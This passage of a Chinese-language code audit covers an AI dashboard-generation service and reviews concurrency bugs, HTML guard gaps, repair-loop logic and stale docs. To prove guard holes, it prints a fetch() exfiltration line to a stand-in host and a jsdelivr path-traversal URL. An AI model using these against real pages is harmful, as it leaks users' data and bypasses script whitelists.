完整 gate 439 次 / 部分失效 1423 次 / 完全關閉 1138 次
gate 完全關閉時：write_file(dashboard.html, "<html>沒讀過 skill</html>") → "written"
```

同一個 rmtree 窗口對進行中的 `read_file` 也致命：
20 次重 stage（~122 ms）期間，併發讀 `.skills/builtin/dashboard/SKILL.md` **失敗 17593 次**。
而 gate 只看 AI message 的 `tool_calls`、**不看對應 ToolMessage 成不成功**
（`app/agent/middleware.py:140-145`），所以 ENOENT 也會判定「讀過了」放行 →
模型在沒看過 skill 的情況下寫 dashboard → guard 退件 → 燒完 5 輪修復 → 「dashboard 製作失敗」。

**修法**
1. `stage_skills` 改成內容比對（hash）後才重建，或 stage 到 `.skills.<pid>.tmp` 再 `os.replace` 原子換名
2. gate 的 read 判定應要求對應 ToolMessage 的 `status != "error"`
3. `_required_paths` 為空即 fail-open（`middleware.py:116`）這個降級方向本身也該重新考慮

---

<a id="f4"></a>
## F4 ○ guard 阻塞 event loop，一輪最多 6 次

`check_dashboard_html` 是重 CPU 的同步呼叫，`app/main.py:321`、`:343`、`:510`、`:529`
都是直接呼叫。一輪要付最多 1 + `GUARD_REPAIR_MAX_RUNS`(5) 次。
部署是 `fastapi run`（`Dockerfile:18`）單一 worker、單一 event loop。

成本細節見 [C4b](#c4b)。**修法**：`anyio.to_thread.run_sync`。

---

<a id="f5"></a>
## F5 ○ `/repair` 對逾期 session 必定 422（但先燒掉兩次模型呼叫）

**機制**
`app/main.py:486` 的 `prepare_workspace(...)` 會 `mkdir(parents=True, exist_ok=True)`
四個目錄（`app/engine/workspace.py:63-66`），對任何 `[\w-]+` 形狀的 id 都成立，
**不驗證 session 是否存在**。

**失敗路徑**
保留策略是 artifact HTML 2 年、workspace 依 session 最後活動 180 天。
使用者打開一份 200 天前的 artifact、按下修復 →
`load_all_results` 回空 dict → `available_query_ids` 為空 →
`_check_referenced_query_ids`（`html_guard.py:1278`）把 HTML 裡每一個
`__ERD_RESULTS__["qN"]` 都判為不存在 → guard **不可能通過** →
使用者等完 2 次模型呼叫（`REPAIR_MODEL_CALL_TIMEOUT_SECONDS` 預設 60，**最長 120 秒**）
才拿到 422；順帶把 retention 剛清掉的空目錄復活。

**修法**：呼叫模型前先做確定性檢查——
`referenced_query_ids(clean_html) - available_query_ids` 非空就直接回 409/422 並說明
「該 session 的查詢結果已逾期清除，無法修復」；`/repair` 用唯讀的 workspace 解析（不 mkdir）。

---

<a id="s1-3"></a>
## S1-3 ○ checkpointer 同 thread_id 併發 ＝ lost update

**機制**
`InMemorySaver.put` 就是 `self.storage[thread_id][ns].update({...})`，
沒有任何樂觀鎖或 parent 檢查；`get_tuple` 取 `max(checkpoints.keys())`。
兩個 run 各自在啟動時載入一次 state，之後全程用自己記憶體裡的 channel values 遞增寫入。

**情境**（不需要使用者亂點，Java 端 SSE 逾時重送就會發生）

1. turn 1 進行中（已寫入若干 checkpoint）
2. turn 2 進來 → `has_checkpoint` = True → `_seed_messages` 只帶 `[HumanMessage(msg2)]`
   （`app/main.py:168`）→ 從 turn 1 的中途 checkpoint 續跑
3. turn 2 先完成、寫入 checkpoint
4. turn 1 稍後完成，寫入**不含 msg2 的** checkpoint，id 更大 → 贏

**結果**：使用者的第二個問題、以及那一輪的所有工具呼叫與回答，**從歷史中完全消失**。
下一輪模型看到的是一段接不上的對話。

**修法**：per-session 的 in-process asyncio.Lock 讓同 sessionId 的 `/chat` 序列化（或直接回 409）。
這同時是 [S0-1](#s0-1) 的根因防線。

---

<a id="m1"></a>
## M1 ▲ ReferenceError stub 遮蔽同 block 後續的其他 Level-2 偵測

**機制**
`html_guard.py:966` 把未宣告變數 stub 成 absorb-all proxy 之後重跑，
該變數之後的所有取值都被吸收成 proxy。

**證據**（同一份 HTML）

```
有 ReferenceError 時：  Line 4: ReferenceError 'undeclaredResults' is not defined
                        Line 6: TypeError: cannot set property 'textContent' of null
把 ReferenceError 拿掉： Line 6: TypeError: ...
                        Line 5: getCol found none of ['no_such_column'] ...   ← 只有這時才看得到
```

**影響**
修復迴圈**天生是多輪的**：第 1 輪修掉 ReferenceError，第 2 輪才會看到欄位綁錯。
而 `_guard_repair_should_stop` 的「數量增加＝改壞，立即停」會把這種
**正常的漸進揭露**誤判成改壞而提前中止。與 [N2](#n2) 是同一個問題的兩面，需一起處理。

另：`stub_variable_names` 跨 block 累積不重置（`:924`）——
block 2 stub 掉的名字，block 7 真的忘了宣告時不會再報。

---

<a id="m3"></a>
## M3 ▲ 錯誤數只有 getCol miss 有上限

`_MAX_REPORTED_COLUMN_MISSES = 8` 只管一條規則。未設限的：

| 規則 | 40 個違規時 |
|---|---|
| `_check_script_src_whitelist`（每個壞 tag 一條） | 40 條 / 6670 字元 |
| `_apply_erd_theme` 非 erd 第二參（每個 init 一條） | 42 條 / 5986 字元 |
| `_check_swallowed_chart_errors`（每個 console.error 一條） | 無界 |
| cascade ReferenceError（block 0 中途死 → 後續 block 全報 TDZ） | 1 個真 bug → 4 條 |

`app/main.py:327-330` 直接 `"\n- ".join(report.errors)` 進 repair prompt。
cascade 那條在語意上是**忠實**的（真瀏覽器裡 block 0 死掉後 `const palette` 確實停在 TDZ），
但對修復 prompt 是純噪音——4 條訊息 1 個根因，
且訊息文字 `ReferenceError: palette is not initialized` 會**誘導模型去改其實沒問題的宣告**。

**修法**：每條規則各自 cap（比照現有 `... and N more` 摘要句）；
對 cascade 做根因收斂——同一 block 之後的 block 若只剩 `is not initialized` 類錯誤，
收成一句「先修 Line X，其餘連鎖錯誤會一併消失」。

---

<a id="n2"></a>
## N2 ○ `_guard_repair_should_stop` 的前提被 PR #6 推翻

**背景**：PR #6 之前，修復是 targeted `edit_file`；之後是**整份重寫**。

`app/main.py:69-80` 的 docstring 明講設計理由：

> 數量增加代表模型把問題改壞了,同樣立刻停,不讓它繼續朝同一個錯誤方向惡化

這個推論在 targeted edit 下成立——只改壞掉的地方，錯誤數上升確實等於退步。
整份重生之後，**兩個方向同時失效**：

| 情境 | 結果 |
|---|---|
| 重寫修好 2 個錯、在原本沒問題的區塊帶出 1 個新錯 | `len` 上升 → **立刻停**，但其實在進步 |
| 整份重生每輪錯誤集合都抖動 | `current == previous` 逐字相同幾乎不可能 → 「卡住」早退**永遠不觸發** → 燒滿 5 輪，每輪一次完整重寫 |

與 [M1](#m1) 對撞：一條為 targeted edit 調校的停止規則，
現在同時擋住正常的漸進揭露、又放行無意義的燒錢。

**修法**：停止規則重新設計。可考慮「錯誤集合的**交集**是否縮小」而非比總數，
或對 [M1](#m1) 這類已知的多輪揭露給明確的輪數配額。

---

<a id="n3"></a>
## N3 ○ single-write 讓 S0-2 的 context 放大再上一檔

[S0-2](#s0-2) 量到的 4.8MB/turn（15.5x 放大）情境是 **1 次 write + 3 次 edit**。
PR #6 之後每輪修復的流程是：

```
read_file(dashboard.html, limit=1000)   ← 整份進 context（skill 明文要求）
write_file(完整 HTML)                    ← 整份再進一次
× 最多 5 輪
```

以 50KB dashboard 估，單 turn 光 dashboard 進出 context 就 ~500KB，
乘上 checkpointer 的 15.5x 放大 ≈ **7.75 MB/turn**。
原本「20 使用者 × 10 輪/天 ≈ 1GB/天」要往上修一個檔次。

`notes.md` 改成 overwritable 也走同一條路（讀全份 → 寫全份），再加一份。

---

# 四、正確但脆弱

<a id="s2-3"></a>
## S2-3 ○ 同步 graph 路徑靜默繞過兩個 middleware（定時炸彈）

`SerializedToolCallsMiddleware` 與 `DashboardSkillGateMiddleware` 只實作 `awrap_tool_call`。
`langchain/agents/factory.py:1007-1014` 依
`m.__class__.wrap_tool_call is not AgentMiddleware.wrap_tool_call` 收集同步 hook →
兩者都不入列 → `wrap_tool_call_wrapper is None` →
`ToolNode._run_one` 走 `if self._wrap_tool_call is None: return self._execute_tool_sync(...)`
（`langgraph/prebuilt/tool_node.py:1044`），
**完全繞過**併發序列化鎖與 skill gate，且不報錯。

目前 `/chat` 走 `astream_events`（async）所以沒踩到，
但任何人加一段 `agent.invoke(...)`（測試、腳本、未來的同步端點）
就會拿到一個無鎖、無 gate 的 agent。

**修法**：至少補一個 `wrap_tool_call` 同步實作（拋 `NotImplementedError` 明示不支援亦可）。

---

<a id="s2-2"></a>
## S2-2 ○ `_unread_required_paths` 兩種「找不到」語意相反

`app/agent/middleware.py:123-146`：

| 情境 | 行為 |
|---|---|
| tool_call id 不在 `state["messages"]` 裡 | `break` 永不觸發 → 掃完全部訊息 → **fail-open** |
| `state` 不是 dict（`ToolNode._extract_state` 在 Send payload 且無 `CONFIG_KEY_READ` 時回 `{}`） | `read_paths` 為空 → **fail-closed**，永久擋住 dashboard 寫入且無恢復路徑 |

第一種正好是「同一則 AI message 內批次 read+write」那條防線失效的方式，
也就是 `tests/test_middleware.py:188` 那個測試在保護的東西。
實際路徑上 `_extract_state` 會回傳含該 AI message 的完整 state，所以正常運作沒問題；
但這個 fallback 的**方向選錯了**——找不到錨點時應該保守，而不是全放行。

兩個方向不一致本身就是 bug——同一個 helper 的兩種降級應有明確且一致的策略。

**附帶**：gate 只看 tool_call 的 `file_path`，**不檢查是否帶了 `limit=1000`**。
模型用預設 100 行讀 SKILL.md（被截斷、沒看到 CDN 白名單那段）也算「讀過」——
而退件訊息裡自己就寫了「pass limit=1000, the 100-line default truncates them」。

---

<a id="s2-1"></a>
## S2-1 ▲ `ToolResultRecorder` FIFO fallback 竊取記錄

`app/agent/tools/recording.py:54-60` 的 `pop`：run_id 對不上時**無條件**吃 FIFO 頭。
而 `EventBridge._handle_tool_end`（`app/agent/events.py:116`）對**每一個** on_tool_end 都 pop。

```python
rec.record("run-sql-1", ...)   # 有 run_id → dict
rec.record(None, q2_record)    # 無 run_id → FIFO
rec.pop("read-file-run-id")    # read_file 的 on_tool_end
# → ToolRunRecord(query_id='q2', ...)   ← 被偷走
rec.pop("run-sql-2")           # q2 自己的 on_tool_end
# → None                                 ← TABLE 事件永久遺失
```

**後果**：TABLE 事件掛在錯誤的 STEP（「檢視 workspace」底下冒出一張表），
真正的 run_sql step 沒有表。

**嚴重度壓在此層的理由**：前提在目前程式路徑下**實際不會發生**——
`StructuredTool._arun` 一定注入帶 `parent_run_id` 的 `run_manager.get_child()`
（`langchain_core/tools/structured.py:119-130`），所以 `_fifo_fallback` 是死路徑。
但這是個「一次 None 就永久污染」的設計：LangChain 升級改行為時，
失效方式是**靜默錯配**而不是報錯。

**修法**：`pop` 只在 `run_id is None` 時才動 FIFO；或刪掉 FIFO，讓失聯時明確回 None。

---

<a id="s2-4"></a>
## S2-4 ✔︎ `has_checkpoint` 全量反序列化 + defaultdict 副作用

`app/agent/session_state.py:21` 用 `checkpointer.get(config) is not None`。
`InMemorySaver.get_tuple`（`langgraph/checkpoint/memory/__init__.py:282-304`）
會 `serde.loads_typed(checkpoint)` **並且** `_load_blobs(...)` 反序列化全部 channel values
——也就是整串對話歷史——只為判斷「有沒有」。長 session 上是幾十 ms 的 event loop 阻塞，
每個 request 一次。

另外 `storage` 是 `defaultdict`，`self.storage[thread_id][checkpoint_ns]` 這個**讀取本身會建立條目**。

**證據**（本機實跑）

```python
for n in range(3): has_checkpoint(f'never-seen-{n}')
# storage == {'never-seen-0': defaultdict(dict, {'': {}}),
#             'never-seen-1': defaultdict(dict, {'': {}}),
#             'never-seen-2': defaultdict(dict, {'': {}})}
```

每個查詢過的 sessionId 永久佔一個巢狀 dict，即使那個 session 從未跑成功。
與 [S0-2](#s0-2) 同一個無淘汰的容器。

**修法**：`return bool(checkpointer.storage.get(session_id, {}).get(""))`
——零反序列化、零副作用。

---

<a id="f3"></a>
## F3 ○ 收尾區段零例外保護，違反自訂契約

`app/main.py:313-401` 有多個未保護的 IO：
`:319`/`:341` 的 `dashboard_path.read_text()`、`:320`/`:342` 的 `load_all_results()`。

**觸發**
- `DashboardOverwriteBackend.write`（`app/agent/graph.py`）是先 `unlink()` 再 `super().write()`；
  後者若失敗（磁碟配額、PVC 短暫 IO 錯誤），`dashboard.html` 就此消失 → `:341` 拋 `FileNotFoundError`
- 任一 `results/*.json` 因前一次程序被 kill 而寫到一半 → `json.loads` 拋 `JSONDecodeError`
- 疊加 [F1](#f1) 的 orphan run 併發改檔

**行為**
例外從 async generator 拋出 → `finally` 有跑（persist/close 沒問題，已實測確認），
但 **wire 上既沒有 ANSWER 也沒有 ERROR**，SSE 在 body 中途硬斷。
此時 dashboard 其實已經在 workspace 裡做好了，整輪卻只換到 Java 端一個通用的
`ANALYSIS_STREAM_FAILURE`。

**這違反了 `_stream_agent_turn` docstring 自己定的契約**
（「呼叫端 MUST 把看到 ERROR 視為本輪最後一個事件」）——收尾階段根本不發 ERROR。

**修法**：把 `:316-404` 包起來，`except Exception` 時 `yield` 一個
`{"type":"ERROR","code":"AGENT_FAILURE",...}`。

---

<a id="n4"></a>
## N4 ○ `unlink()` → `write()` 成為每次變更的必經路徑

PR #6 之後：

```python
if resolved_path in overwritable_paths and resolved_path.exists():
    resolved_path.unlink()
return super().write(file_path, content)
```

先刪再寫。`super().write()` 若失敗，**上一份可用的 dashboard 就此消失且無回滾**。

以前 `edit_file` 失敗只是回一個「String not found」、檔案完好；
現在**每一次修改**都要先把好的那份刪掉。再疊上 [F3](#f3) →
`FileNotFoundError` → SSE 中途硬斷。

這使 F3 的嚴重度從「偶發」升級為「必經路徑上的風險」。

（Java 端 artifact 已落庫，使用者可見的歷史版本還在——
但本輪的 workspace 基底沒了，下一輪 continue-edit 會從空的開始。）

**修法**：改成 write-temp + `os.replace` 原子換名，失敗時原檔完好。

---

<a id="h2"></a>
## H2 ▲ jsdelivr path traversal + rewriter 契約落差

**Path traversal**
`_is_allowed_script_src`（`html_guard.py:1222-1240`）只做
`parsed.path.startswith("/npm/echarts@")`，不做路徑正規化：

```
https://cdn.jsdelivr.net/npm/echarts@5/../../npm/evilpkg@1/x.js   → True
```

瀏覽器依 URL spec 先正規化再送出，實際請求 `/npm/evilpkg@1/x.js`——
jsdelivr 會照 serve 任意 npm 套件。這是「不放行該網域下任意套件」這條限制的直接繞過。

**更常踩到的：契約落差**
`backend/src/main/resources/application.yml:50` 的 rewrite pattern 寫死
`https://cdn\.jsdelivr\.net/npm/echarts@5[^"']*`，但 guard 允許 `/npm/echarts@` 的**任何版本**。
`echarts@4.9.0`、`echarts@latest` 通過 guard 卻**不會**被 `ArtifactCdnRewriter` 換成 `/vendor/`
——在離線的公司環境就是**整頁圖表載不出來**。
同理 `https://cdn.jsdelivr.net:1337/npm/echarts@5/e.js` 也是 True 但 rewriter 不認。

**已驗證擋得住的**（不必動）：userinfo `@evil.com`、protocol-relative `//evil.com`、
`data:`/`javascript:`、`http://`、`/gh/` 路徑、lookalike host、trailing dot。

**修法**：`posixpath.normpath(parsed.path)` 後再比對；
path prefix 改成與 rewriter 同源的常數（`/npm/echarts@5`）；要求 `parsed.port is None`。

---

<a id="h3"></a>
## H3 ▲ 跨 block stack frame 捏造行號

`_resolve_error_frames`（`html_guard.py:633-659`）對**每個** frame 都套當前 block 的
`html_start_line`（`:952`），但 stack 裡可能有定義在**別的 `<script>` block** 的函式 frame。
`_SANDBOX_INTERNAL_FRAME_NAMES` 只濾掉 prelude frame；
`resolved_line > html_line_count` 的安全網只在行號超出檔尾時生效，
落在範圍內的假行號一律照報。

**而 skill 的標準佈局就是「helper 一個 script tag、圖表另一個」，所以這是常態不是邊角**：

```
 2 <script>
 3 function renderKpi(spec){
 4   return spec.series.length;      <- 真正的 throw 點
 5 }
 6 </script>
   ... 20 行 markup ...
27 <script>
28 renderKpi(undefined);             <- 真正的呼叫點
29 </script>
```

guard 回報：`Line 29: TypeError: cannot read property 'series' of undefined`。
**29 是空的 `</script>`。** 模型拿到唯一一個位置線索，而它指向不存在的東西。

**修法**：`_execute_scripts_smoke` 把「已執行過的 block」的 (start_line, 行數) 累積成一張表，
`_resolve_error_frames` 依 frame 的相對行號反查它屬於哪個 block 再換算；
查不到就丟棄該 frame（沿用現有 bounds-check 的保守精神）。

---

<a id="m2"></a>
## M2 ▲ `</head>` 在註解裡 → 注入進註解，整頁零資料

`app/engine/results.py:19` / `app/engine/theme.py:24` 都是純 regex `</head>`，
不感知註解或字串：

```html
<html><head><!-- </head> --><title>x</title></head>...
```

→ `<script id="erd-results-data">` 被插進 `<!-- ... -->` 內部，完全惰性。
`window.__ERD_RESULTS__` 從未定義、erd theme 從未註冊 → 全頁圖表死光，
**且沒有任何訊號**（注入在 guard 之後）。

機率不高但後果是整份 artifact 報廢。
**修法**：改成「找最後一個 `</head>`」，或先用 `_mask_strings_and_comments` 的同一套遮罩找插入點。

---

<a id="m4"></a>
## M4 ▲ 引數區註解含撇號 → 靜默不套 erd 主題

`_find_matching_close_paren`（`html_guard.py:1292-1320`）認 `'` `"` 但不認註解（也不認 backtick）：

```js
const chart = echarts.init(document.getElementById('chart') /* don't reuse */);
```

`don't` 的撇號開啟 quote 態且永不關閉 → 回 `None` → `:1374-1376` 走「畸形呼叫」分支，
原樣保留、**不記 error**。結果 `guard ok=True` 但 `'erd'` 從未補上，
圖表用 ECharts 預設色盤出貨。

**修法**：同 [C1](#c1) 的遮罩修法一併解決；另外「括號不平衡」這個分支應該記一條 error 而非靜默跳過。

---

<a id="f6"></a>
## F6 ○ 截斷回應的 fence fallback 出貨

`app/main.py:431` 的 `_HTML_FENCE_PATTERN` 需要**成對**的 ``` 才會匹配；
`:450` 的 fallback 是「整段 raw 回應 strip 後直接當 HTML」。

**場景**：模型輸出被 `max_tokens` 截斷，回應長這樣：
`"Here is the fixed HTML:\n```html\n<html>…<div…"` 且沒有結尾 fence →
regex 不匹配 → `candidate_html` 連 `Here is the fixed HTML:` 和 ` ```html ` 一起帶進去。

`_check_structure`（`html_guard.py:92-97`）只檢查「非空且含 `<div`」，
若截斷點落在最後一段 `<script>` 之後（純 markup 尾巴），JS 語法檢查也抓不到 →
**回 200，前端 iframe 頂端渲染出 `Here is the fixed HTML: ```html` 這行字，且 HTML 尾巴是截斷的**。

**與 [N1](#n1) 是同一類問題**，修法共用：`_check_structure` 加 `</html>` 結尾檢查；
fallback 前先處理「有開頭 fence、無結尾 fence」的情況。

---

<a id="s3"></a>
## S3 ○ auth：token 回寫較舊值、client 永不關閉

`app/agent/auth.py` 的核心語意是安全的：
`sync_auth_flow`/`async_auth_flow` 拿到的 `request` 是 httpx 每個請求各自建立的物件、
generator 也是 per-request，所以「跨 yield 改同一個 request」不構成跨請求污染；
`_token`/`_expires_at` 全程在 `_cache_lock` 下；401 重試路徑對 JSON body 是安全的。

兩個實質問題：

1. **`_extract_token` → `_store_token` 與 `invalidate()` 競爭會寫回較舊的 token。**
   請求 A `invalidate()` → 開始 exchange；請求 B 同時 miss → exchange → 存入 T2；
   A 的（較早取得的）T1 後到、覆蓋 T2。若交換端點對舊 token 做失效處理，
   接下來的呼叫會拿 401——靠單次重試自癒，所以只是多一次 round-trip。
   class docstring 承認「last-write-wins，不做交換去重」，
   但只提到「最多多換一次」，**沒提到會回寫舊值**，值得補一行。
2. **`_clients` 永不關閉**（`app/agent/auth.py:141`）。
   程序生命週期共用是刻意設計，但缺 FastAPI lifespan 的 `aclose()`，
   關機時留下未關閉的連線池與 httpx 警告。補一個 shutdown hook 是零成本。

---

<a id="n5"></a>
## N5 ✔︎ 三處 stale `edit_file` 引用

PR #6 已把 `edit_file` 從模型可見 schema 移除，但這三處還在提它：

| 位置 | 內容 | 問題 |
|---|---|---|
| `deepagent-service/README.md:106` | `dashboard.html # 模型直寫的 self-contained dashboard（迭代用 edit_file 局部改）` | **與新不變量直接相反** |
| `skills/dashboard/SKILL.md:21` | 「NEVER write a skeleton first and then fill in charts with a series of `edit_file` calls」 | 對模型提到一個 schema 裡不存在的工具 |
| `app/main.py:329` | 修復訊息「(edit_file on dashboard.html is rejected)」 | 同上 |

後兩處尤其值得改：**SKILL.md 是模型的權威文件，在裡面提到一個它看不到的工具，
等於在邀請它幻覺呼叫**——而那正是第二層 `edit()` 退貨存在的理由。
拿掉提及比留著退貨訊息更省一輪。

（`app/agent/middleware.py:68` 的 `_GATED_TOOL_NAMES` 仍含 `edit_file`
是合理的 defense-in-depth，不用動。）

---

<a id="n6"></a>
## N6 ○ `notes.md` 全量重寫但無「保留既有內容」警告

PR #6 把 `notes.md` 加入 `_OVERWRITABLE_FILE_NAMES`，且 `edit_file` 已從模型移除，
所以 notes.md 也只能整份重寫。

SKILL.md 對 dashboard 有明確警告：

> **Preserve everything the user didn't ask to change**: the rewrite must carry over all
> unchanged sections verbatim... A rewrite that silently drops or alters unrelated charts is a defect.

`notes.md` **沒有對應的話**，而 system prompt 說它的用途是
「Interim findings can be recorded in notes.md **for reference in later turns**」
——跨輪累積的東西，改成全量重寫後每次都有整段掉光的風險，且無人察覺。

**修法**：system prompt 或 skill 補一句等價警告。

---

<a id="l1l4"></a>
## L1–L4 ▲ html_guard 四條 LOW

| ID | 問題 |
|---|---|
| **L1** | **未加引號的 `id=`**：`_ELEMENT_ID_ATTRIBUTE_PATTERN`（`:577`）要求引號，`<div id=chart>` 是合法 HTML5 但不會進 known-id set → `getElementById('chart')` 回 `null` → **誤報** `TypeError`。實測 `ok=False` |
| **L2** | **`data-id="ghost"` 汙染 known-id set**：`\bid` 的 `\b` 在 `-` 和 `i` 之間成立——與 `_SRC_ATTR_VALUE_PATTERN:62` 已用 `(?<![\w-])` 修掉的是同一個坑，**這裡漏改**。會讓不存在的 element id 被當成存在 → missing-DOM-id 偵測漏抓 |
| **L3** | **`registerTheme(` 出現在註解/字串**：`_check_no_register_theme`（`:1266`）是純子字串比對，`// never call echarts.registerTheme( yourself` 就退件。實測 `ok=False`。同樣一句遮罩解決 |
| **L4** | **`strip_injected_blocks` 非字串感知**：模型自寫 `<script id="erd-results-data">var a = "</script>";</script>` 被剝到第一個 `</script>` 為止，留下裸露的 `";</script>` 文字節點。要模型故意寫才會中，但 continue-edit 路徑上會累積 |

---

# 五、文件錯誤（會誤導後續 review）

| 位置 | 現況 | 事實 |
|---|---|---|
| `docs/deepagent-html-guard-checks.md:62` | 「真正安全邊界在 serve 層 CSP」 | **全 repo 沒有任何 CSP 設定**（`ArtifactController.java:63-68` 不送任何 CSP header）。唯一邊界是 `frontend/src/components/artifact/ArtifactPanel.tsx:242` 的 `sandbox="allow-scripts"`（無 `allow-same-origin`，拿不到 parent DOM/cookie，但**網路出口不受限**） |
| `LangGraphAnalysisProvider.java:206-207` | 「agent-service never sets `StepEvent#status()`」 | deepagent-service **每一個** STEP 都帶 status，`:212` 的正規化是死路徑 |
| `LangGraphAnalysisProvider.java:119-120` | 「bounds a runaway query's **wall time**」 | `Flux#timeout(Duration)` 是逐 item 閒置語意（`AnalysisAgentProperties.java:8-9` 的 javadoc 講對了）。**整條鏈路沒有任何總時長上限** |
| `app/agent/middleware.py:23` | 「`write_file`/`edit_file` 是無鎖讀改寫」 | `edit_file` 已從模型移除；鎖仍必要（`write_file` 依然是無鎖讀改寫），但敘述已 stale |

**CSP 那條的補充實證**：guard 完全不看 `<link>`、`<iframe>`、`<img>`、`<style>@import`、
inline `fetch()` / `import()` / `new Worker()`：

```js
fetch('https://evil.example/exfil', {method:'POST', body: JSON.stringify(window.__ERD_RESULTS__)});
// _check_script_src_whitelist → errors == []
```

在 opaque origin 裡這仍能把使用者上傳資料外洩。
這不見得要 guard 解（**加 CSP header 更對**），但文件那句話必須更正，
否則後續 review 會以為有一層不存在的防護。

---

# 六、已排除 — 確認不是 bug

逐條查證過，記錄下來省得日後重審：

**併發 / 中介層**
- `SerializedToolCallsMiddleware` 的 asyncio.Lock **確實被進入，也確實涵蓋 executor thread**
  （追鏈：`ToolNode._afunc` → `_arun_one` → `awrap_tool_call` → `StructuredTool._arun` → `run_in_executor`，全程 awaited）
- 同理 `connection_lock`（`threading.Lock`）在 executor thread 上取得，**不阻塞 event loop**
- `request.override(system_message=...)` **不會累積**——`override` immutable
  （`langchain/agents/middleware/types.py:201`），且 `ModelRequest` 每次都用 base system_message 重建
- bearer 模式的 httpx client 走 `_cached_async_httpx_client`（`lru_cache`），
  per-request `build_model()` **不會**洩漏連線

**串流編排**
- retry 的 queue drain 乾淨（每次重試在 `while True` 開頭重建 `event_queue`，舊 queue 連同殘留 `None` 一起丟棄）
- `await producer_task` **不吞例外**（`pump_agent_events` 用 `except BaseException` 經 queue 轉發，只有 `CancelledError` 重拋）
- 同一份 `run_input` 重跑**不會**重複灌 checkpoint（`add_messages` 依 `message.id` 去重）
- first-round retry 的 stale TABLE **不成立**（重試前提是 `not bridge.tool_started`，
  而任何 `record()` 必伴隨一個 `on_tool_start`）
- guard 修復迴圈的 `previous_errors` 初始化與更新序列**正確**（第一次比較有意義，提早 break 不更新也無害）
- 送出的 HTML **恆等於**被檢查的 HTML（用最後一次 `check_dashboard_html` 回傳的 `report.html`）
- `referenced_results` 的 dict comprehension **不會** KeyError
  （`report.ok` 蘊含 `referenced ⊆ available`，`_apply_erd_theme` 不新增引用）
- ERROR 早退時 `finally` **會執行**（`return` 與 `CancelledError` 兩條路徑實測確認 `connection.close()` 被呼叫）

**wire 契約**
- 六種事件（STEP/TOKEN/TABLE/DASHBOARD_HTML/ANSWER/ERROR）的欄位與 Java DTO **完全對齊**，
  無欄位名／shape／nullability 不匹配
- `DASHBOARD_HTML` 刻意不進 `@JsonSubTypes`，由 `LangGraphAnalysisProvider.java:267-280` 先嗅 `type` 攔截——正確
- `dashboard_guard` STEP with `status: "ERROR"` **全鏈路正確**：
  Java `StepStatus.ERROR` 解得出、進 `stepAccum` 落庫、前端 `StepChain.tsx:16` 映射成 error 狀態且有測試守著；
  因為不是 `ErrorEvent`，`errorRef` 保持 null，finalize 走「No HTML produced」，
  把帶 `DASHBOARD_REJECTED_PREFIX` 的 ANSWER 落庫。**不會產生假 artifact**
- `/repair` 的 request/response 兩側**完全對齊**
- Jackson 走 Spring Boot 預設（`FAIL_ON_UNKNOWN_PROPERTIES` 關閉），Python 未來加欄位不會炸

**MUST-sync 複本零漂移**（三對全部同步）
| Python | Backend | 結果 |
|---|---|---|
| `theme.py:11-22` `ERD_THEME_SCRIPT` | `templates/artifact/head-inject.vm:4` | **732 字元 byte-for-byte 相同**，8 色 CVD-safe 盤色值與槽位順序全一致 |
| `html_guard.py:108-177` `_find_script_end` | `JsSyntaxValidator.java:108-202` `findScriptEnd` | 六個 lexer state 逐一對應（唯一差異是邊界檢查寫法，語意等價） |
| `html_guard.py:36-40` `ALLOWED_SCRIPT_SRC_PREFIXES` | `templates/openai/system-prompt.vm:42,:44` | 一致 |

> `theme.py` 多了 `id="erd-theme"` 是**刻意的單向擴充**（`strip_injected_blocks` 靠這個 id 做確定性剝除），不是漂移。

**已驗證擋得住的攻擊**（`_is_allowed_script_src`）：userinfo `@evil.com`、
protocol-relative `//evil.com`、`data:`/`javascript:`、`http://`、`/gh/` 路徑、
lookalike host、trailing dot。

**已驗證沒問題的 lexer 邊角**：`a / b / c` 除法、`` `x</script>y` `` 在 template literal 內、
`<!--` in script、簡單 `${}` 內插。

---

# 七、根因

四個根因涵蓋大部分 findings：

| 根因 | 涵蓋 | 一句話 |
|---|---|---|
| **A. 沒有 per-session 跨 request 互斥** | [S0-1](#s0-1)、[S1-2](#s1-2)、[S1-3](#s1-3)，**觸發源是 [F1](#f1)** | 一把 per-sessionId 的 asyncio.Lock（或直接回 409）能同時擋住四條 |
| **B. 單 worker event loop 上做阻塞 I/O 與重 CPU** | [S0-3](#s0-3)、[S1-1](#s1-1)、[C4b](#c4b)、[F4](#f4) | **連鎖放大 [#3](#c-3)**——阻塞期間所有 session 心跳一起發不出去 |
| **C. guard 的字串/註解感知不一致** | [C1](#c1)、[C3](#c3)、[M2](#m2)、[M4](#m4)、[L3](#l1l4)、[L4](#l1l4) | `_apply_erd_theme` 是唯一會改寫原文、也是唯一沒走遮罩的掃描器 |
| **D. 檢查與出貨走不同資料 / 不同時機** | [C2](#c2)、[H1](#h1)、[H4](#h4)、[M2](#m2) | guard 檢查的和使用者拿到的不是同一份 |

獨立於根因之外：[#1](#c-1)、[#2](#c-2)、[S0-2](#s0-2)、[N1](#n1)、[N2](#n2)、
[F3](#f3)/[N4](#n4)、[F5](#f5)、[H2](#h2)、[H3](#h3)、[M1](#m1)、[M3](#m3)、[S2-*](#s2-3)、[S3](#s3)、[N5](#n5)、[N6](#n6)。

---

# 八、建議批次

## 第一批 — 止血（各自獨立、小改動、風險低）

| ID | 修法 | 擋掉什麼 |
|---|---|---|
| [C2](#c2) | sandbox seed 改用 `referenced_query_ids` | 靜默出貨零資料頁（一行關兩個洞） |
| [H4](#h4) | `serialized.replace("<", "\\u003c")` | 使用者 CSV 吃掉整個 body |
| [#1](#c-1) | role 改吃 `"assistant"` | AI 歷史全降級 |
| [S0-1b](#s0-1b) | `load_all_results` 損毀檔降級 | session 永久 brick |
| [C4](#c4) | `set_memory_limit` + 全域 deadline | process 被 OOM kill |
| [N1](#n1) | 先實測截斷行為；`_check_structure` 加 `</html>` | 半截 HTML 出貨 |
| [N2](#n2) | 停止規則重新設計 | 前提已被推翻，兩個方向都錯 |
| [N5](#n5) | 三處文件更正 | 幾乎零成本，一併帶進去 |

## 第二批 — 各自獨立、需要設計

[C1](#c1) + [M4](#m4)（`_apply_erd_theme` 走遮罩 + 改寫後重驗語法）·
[C3](#c3)（regex literal 狀態機，**要同步回寫 backend `JsSyntaxValidator.java`**）·
[H1](#h1) · [F1](#f1)（cancel + aclosing）· [F2](#f2)（retry 前終結 active_steps）·
[N4](#n4)（write-temp + `os.replace`）· [F3](#f3)

## 第三批 — 系統性，各自一支 plan

根因 A 的 per-session lock · 根因 B 的 `to_thread` 改造 ·
[S0-2](#s0-2) 換掉 `InMemorySaver` · [#2](#c-2) xlsx 決策 · [#3](#c-3) heartbeat ·
